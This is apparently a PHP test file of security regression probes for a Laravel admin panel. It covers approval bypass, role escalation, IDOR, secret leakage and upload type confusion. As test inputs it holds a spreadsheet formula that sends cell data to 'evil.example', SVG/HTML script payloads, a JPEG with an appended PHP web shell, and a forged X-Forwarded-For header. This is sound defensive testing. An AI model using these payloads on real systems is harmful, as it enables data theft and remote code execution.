<?php

use App\Actions\Admin\Members\RequestMemberExport;
use App\Actions\Admin\Members\StartViewAs;
use App\Actions\Admin\Moderation\PublishRateLimits;
use App\Actions\Admin\Team\AcceptStaffInvite;
use App\Actions\Admin\Team\ApplyPermissionMatrix;
use App\Actions\Admin\Team\ChangeStaffRoles;
use App\Actions\Admin\Team\InviteStaff;
use App\Actions\Admin\Team\SaveRole;
use App\Actions\Support\CreateSupportTicket;
use App\Enums\AdminMemberEvent;
use App\Enums\AiFeature;
use App\Enums\ApprovalStatus;
use App\Enums\BrandAssetKind;
use App\Enums\SupportCategory;
use App\Models\ApprovalRequest;
use App\Models\AuditEvent;
use App\Models\DataExport;
use App\Models\Role;
use App\Models\Staff;
use App\Models\User;
use App\Services\Ai\Agents\TranslateAgent;
use App\Services\Approvals\Approvals;
use App\Services\Brand\BrandAssets;
use App\Services\Team\StaffInvites;
use App\Services\Team\TeamRefused;
use Illuminate\Auth\Access\AuthorizationException;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Storage;
use Illuminate\Validation\ValidationException;

require_once __DIR__.'/../Admin/Actions/Helpers.php';
require_once __DIR__.'/../Admin/M32/Helpers.php';
require_once __DIR__.'/../Admin/Config/ConfigHelpers.php';
require_once __DIR__.'/../Messaging/MessagingTestHelpers.php';
require_once __DIR__.'/../Ai/AiTestHelpers.php';

/**
 * Security review Phase 3, round 2 (docs/reports/security/phase-3.md §6.4): abuse probes that hold at e57550e, kept as regression tests.
 * Four-eyes over HTTP, escalation through custom roles, the admin fence (both layers), per-staff downloads, view-as after suspension,
 * formula-safe member CSV, secrets in system pages, brand upload type confusion, rate-limit override bounds, enumeration for roles
 * without PII, invite links, translate and support IDOR.
 */
beforeEach(function () {
    $this->withoutDefer();
    Mail::fake();
    Storage::fake('local');
    Storage::fake(config()->string('speedclub.media.private_disk'));
});

function p3r2SignIn(Staff $staff): Staff
{
    app('auth')->forgetGuards();
    actingAsStaff($staff);
    test()->withSession(['auth.password_confirmed_at' => time()]);

    return $staff;
}

describe('four-eyes over HTTP', function () {
    it('refuses the requester and the staff member the request is about, answers a replay without a second run, and expires after 24 h', function () {
        $admin = m31Staff('admin');
        $member = User::factory()->create();
        $request = app(RequestMemberExport::class)->handle($admin, $member, m32Reason());

        p3r2SignIn($admin);
        $this->post("/admin/team/approvals/{$request->id}/approve", ['comment' => 'passt so'])->assertForbidden();
        expect($request->refresh()->status)->toBe(ApprovalStatus::Pending);

        p3r2SignIn(m31Staff('admin'));
        $this->post("/admin/team/approvals/{$request->id}/approve", ['comment' => 'passt so'])->assertRedirect();
        expect($request->refresh()->status)->toBe(ApprovalStatus::Executed);
        expect($this->post("/admin/team/approvals/{$request->id}/approve", ['comment' => 'nochmal'])->status())->toBeIn([302, 303, 409]);
        expect(AuditEvent::query()->where('action', AdminMemberEvent::ExportRequested->value)->count())->toBe(1);

        $target = m31Staff('admin');
        $demote = app(ChangeStaffRoles::class)->handle($admin, $target, ['support'], m32Reason())->approval;
        p3r2SignIn($target);
        $this->post("/admin/team/approvals/{$demote->id}/approve", ['comment' => 'passt so'])->assertForbidden();
        expect($demote->refresh()->status)->toBe(ApprovalStatus::Pending);

        $late = app(RequestMemberExport::class)->handle($admin, User::factory()->create(), m32Reason());
        $this->travel(25)->hours();
        p3r2SignIn(m31Staff('admin'));
        $this->post("/admin/team/approvals/{$late->id}/approve", ['comment' => 'zu spät']);
        expect($late->refresh()->status)->toBe(ApprovalStatus::Expired);
    });

    it('refuses a holder of the role a sensitive grant goes to, and the requester granting to a role they hold', function () {
        $requester = m31Staff('admin');
        app(SaveRole::class)->handle($requester, null, 'Teamleitung', null, ['qr.view']);
        $holder = m31Staff('admin');
        $holder->assignRole('Teamleitung');
        $request = app(ApplyPermissionMatrix::class)->handle($requester, ['Teamleitung' => ['qr.view', 'members.export']], m32Reason())->approval;

        expect($request)->not->toBeNull()
            ->and(fn () => app(Approvals::class)->approve($request, $holder->fresh()))->toThrow(AuthorizationException::class);

        $requester->assignRole('Teamleitung');
        expect(fn () => app(ApplyPermissionMatrix::class)->handle($requester->fresh(), ['Teamleitung' => ['qr.view', 'audit.export']], m32Reason()))
            ->toThrow(TeamRefused::class);
    });

    it('counts two bulk runs of 100 by one staff member inside 24 h together (SEC-P3-08)', function () {
        p3r2SignIn(m31Staff('admin'));

        foreach ([1, 2] as $run) {
            $ids = User::factory()->count(100)->create()->pluck('id')->all();
            $this->post('/admin/members/bulk', ['action' => 'revoke_sessions', 'ids' => $ids, 'reason' => m32Reason()])->assertRedirect();
        }

        expect(ApprovalRequest::query()->where('action', 'members.bulk')->count())->toBe(1)
            ->and(AuditEvent::query()->where('action', 'member.sessions_revoked_by_staff')->count())->toBe(100);
    });
});

it('makes a custom role with a sensitive atom, inviting with it and assigning it wait for a second person', function () {
    $admin = m31Staff('admin');
    $outcome = app(SaveRole::class)->handle($admin, null, 'Freigabe', null, ['approvals.decide', 'members.view'], m32Reason());
    $role = Role::query()->where('name', 'Freigabe')->sole();
    expect($outcome->approval)->not->toBeNull()->and($role->permissions->pluck('name')->all())->toBe([]);

    app(Approvals::class)->approve($outcome->approval, m31Staff('admin'));

    $invite = app(InviteStaff::class)->handle($admin, 'Neu', 'neu.p3r2@example.de', ['Freigabe'], m32Reason());
    expect($invite->approval)->not->toBeNull()
        ->and(Staff::query()->where('email', 'neu.p3r2@example.de')->sole()->getRoleNames()->all())->toBe([]);

    $other = m31Staff('support');
    expect(app(ChangeStaffRoles::class)->handle($admin, $other, ['Freigabe', 'support'], m32Reason())->approval)->not->toBeNull()
        ->and($other->fresh()->hasRole('Freigabe'))->toBeFalse()
        ->and(fn () => app(ChangeStaffRoles::class)->handle($other->fresh(), $other->fresh(), ['support', 'Freigabe'], m32Reason()))->toThrow(AuthorizationException::class);
});

describe('admin fence', function () {
    it('keeps the bare 404 for a forged X-Forwarded-For under TRUSTED_PROXIES=* and for an unknown URL (SEC-P3-04, -05)', function () {
        config(['speedclub.staff.ip_allowlist' => ['203.0.113.7'], 'speedclub.trusted_proxies' => ['*']]);

        $forged = $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.20'])->withHeader('X-Forwarded-For', '203.0.113.7')->get('/admin/login');
        $unknown = $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.20'])->get('/admin/does-not-exist');

        expect($forged->getStatusCode())->toBe(404)->and($forged->getContent())->toBe('')
            ->and($unknown->getStatusCode())->toBe(404)->and((string) $unknown->getContent())->not->toContain('Ziggy');
    });

    it('keeps the bare 404 for a path longer than the fallback route accepts (the AdminErrorPage layer of SEC-P3-04)', function () {
        config(['speedclub.staff.ip_allowlist' => ['203.0.113.7']]);
        $response = $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.20'])->get('/admin/'.str_repeat('a', 240));

        expect($response->getStatusCode())->toBe(404)->and((string) $response->getContent())->not->toContain('Ziggy')->not->toContain('admin.dashboard');
    });
});

it('serves the staff copy of a member export to its requester only', function () {
    $requester = m31Staff('admin');
    $approver = m31Staff('admin');
    $member = User::factory()->create();
    app(Approvals::class)->approve(app(RequestMemberExport::class)->handle($requester, $member, m32Reason()), $approver);
    $export = DataExport::query()->sole();

    foreach ([$approver, m31Staff('owner')] as $staff) {
        p3r2SignIn($staff);
        expect($this->get("/admin/members/{$member->id}/exports/{$export->id}/download")->getStatusCode())->toBeIn([403, 404]);
    }
});

it('ends a view-as with the suspension of its staff member (SEC-P3-07)', function () {
    $staff = m31Staff('admin');
    $token = app(StartViewAs::class)->handle($staff, User::factory()->create(), m32Reason(), false)['token'];
    $this->withToken($token)->getJson('/api/v1/auth/me')->assertOk();

    $staff->forceFill(['status' => 'suspended'])->save();
    app('auth')->forgetGuards();
    $this->withToken($token)->getJson('/api/v1/auth/me')->assertUnauthorized();
});

it('writes formula-looking display names as text in the member list CSV', function () {
    User::factory()->create(['username' => 'evil.p3r2', 'display_name' => '=HYPERLINK("https://evil.example/?"&A1,"x")']);
    User::factory()->create(['username' => 'evil.p3r2b', 'display_name' => '@SUM(1+1)']);
    p3r2SignIn(m31Staff('admin'));
    $csv = $this->get('/admin/members/export.csv')->assertOk()->streamedContent();

    expect($csv)->toContain("'=HYPERLINK")->toContain("'@SUM")->not->toContain(',"=HYPERLINK')->not->toContain(',=HYPERLINK')->not->toContain(',@SUM');
});

it('never prints a secret value on the system, settings or account pages', function () {
    config([
        'mail.default' => 'smtp', 'mail.mailers.smtp.password' => 'SECRET-SMTP-p3r2', 'mail.mailers.smtp.username' => 'SECRET-USER-p3r2',
        'broadcasting.default' => 'pusher', 'broadcasting.connections.pusher.secret' => 'SECRET-PUSHER-p3r2', 'broadcasting.connections.pusher.key' => 'pk', 'broadcasting.connections.pusher.app_id' => '1',
        'speedclub.services.ai_provider' => 'anthropic', 'ai.providers.anthropic.key' => 'SECRET-AI-p3r2',
        'speedclub.services.expo_access_token' => 'SECRET-EXPO-p3r2', 'speedclub.services.turnstile_secret' => 'SECRET-TS-p3r2',
        'speedclub.services.sentry_dsn' => 'https://SECRET-SENTRY-p3r2@o1.ingest.sentry.io/1',
    ]);
    p3r2SignIn(m31Staff('owner'));
    $all = '';

    foreach (['/admin/system/health', '/admin/system/integrations', '/admin/system/jobs', '/admin/settings', '/admin/account'] as $uri) {
        $response = $this->get($uri);
        expect($response->status())->toBe(200, $uri);
        $all .= (string) $response->getContent();
    }

    expect($all)->not->toContain('SECRET-');
});

it('refuses SVG, HTML and GIF brand uploads and re-encodes a JPEG with appended PHP', function () {
    m35FakeDisks();
    $staff = m31Staff('owner');
    $dir = sys_get_temp_dir().'/p3r2-'.uniqid();
    mkdir($dir);
    file_put_contents("$dir/logo.svg", '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(1)</script></svg>');
    file_put_contents("$dir/page.png", '<html><script>alert(1)</script></html>');
    imagegif(imagecreatetruecolor(1600, 1600), "$dir/a.gif");
    imagejpeg(imagecreatetruecolor(1600, 1600), "$dir/hero.jpg");
    file_put_contents("$dir/hero.jpg", file_get_contents("$dir/hero.jpg").'<?php system($_GET["c"]); ?>');

    foreach (['logo.svg' => BrandAssetKind::WordmarkWhite, 'page.png' => BrandAssetKind::WordmarkWhite, 'a.gif' => BrandAssetKind::Hero] as $name => $kind) {
        expect(fn () => app(BrandAssets::class)->store(new UploadedFile("$dir/$name", $name, 'image/png', null, true), $kind, $staff))->toThrow(ValidationException::class);
    }

    $asset = app(BrandAssets::class)->store(new UploadedFile("$dir/hero.jpg", 'hero.php.jpg', 'image/jpeg', null, true), BrandAssetKind::Hero, $staff);
    foreach ($asset->variants as $path) {
        expect(Storage::disk(config()->string('speedclub.brand.public_disk'))->get($path))->not->toContain('<?php')->and($path)->not->toContain('.php');
    }
    expect(Storage::disk(config()->string('speedclub.brand.private_disk'))->get($asset->original_path))->not->toContain('<?php');
});

it('refuses a rate-limit override above 4x the default', function () {
    $login = config()->integer('speedclub.rate_limits.member_login.max');

    expect(fn () => app(PublishRateLimits::class)->handle(m31Staff('moderator'), ['member_login' => $login * 5], m32Reason()))->toThrow(ValidationException::class);
});

it('lets no role without members.view_pii test an address in the admin search or the member list', function () {
    User::factory()->create(['email' => 'secret.p3r2@example.de', 'username' => 'kai.hidden']);
    p3r2SignIn(m31Staff('analyst'));

    expect(json_encode($this->getJson('/admin/search/suggest?q='.urlencode('secret.p3r2@example.de'))->json()))->not->toContain('kai.hidden')
        ->and((string) $this->get('/admin/members?filter[q]='.urlencode('secret.p3r2@example.de'))->getContent())->not->toContain('kai.hidden');
});

it('accepts an invite link once and refuses a replaced or reused one alike', function () {
    $owner = m31Staff('owner');
    app(InviteStaff::class)->handle($owner, 'Neu', 'neu2.p3r2@example.de', ['support']);
    $staff = Staff::query()->where('email', 'neu2.p3r2@example.de')->sole();
    $token = fn (string $url): string => (function () use ($url): string {
        parse_str((string) parse_url($url, PHP_URL_FRAGMENT), $fragment);

        return (string) ($fragment['token'] ?? '');
    })();
    $old = $token(app(StaffInvites::class)->issue($staff, $owner));
    $new = $token(app(StaffInvites::class)->issue($staff, $owner));
    $password = ['password' => 'Kurbelwelle-Drehmoment-2026', 'password_confirmation' => 'Kurbelwelle-Drehmoment-2026'];

    expect(fn () => app(AcceptStaffInvite::class)->handle($old, $password))->toThrow(TeamRefused::class);
    app(AcceptStaffInvite::class)->handle($new, $password);
    expect(fn () => app(AcceptStaffInvite::class)->handle($new, $password))->toThrow(TeamRefused::class);
});

it('keeps another member\'s message and support ticket out of ai/translate and SET-15', function () {
    aiOn(AiFeature::Translate);
    TranslateAgent::fake()->preventStrayPrompts();
    msgFlags();
    $message = msgStart(aiMember(), aiMember(), 'Privat');
    $ticket = app(CreateSupportTicket::class)->forMember(User::factory()->create(), SupportCategory::cases()[0], 'Betreff', 'Geheimer Text');
    aiActAs(aiMember());

    $this->postJson('/api/v1/ai/translate', ['source' => 'message', 'id' => strtoupper($message->id), 'to' => 'en'])->assertNotFound();
    $this->getJson('/api/v1/support/tickets/'.strtoupper($ticket->id))->assertNotFound();
    expect(json_encode($this->getJson('/api/v1/support/tickets')->json()))->not->toContain('Geheimer');
    TranslateAgent::assertNeverPrompted();
});
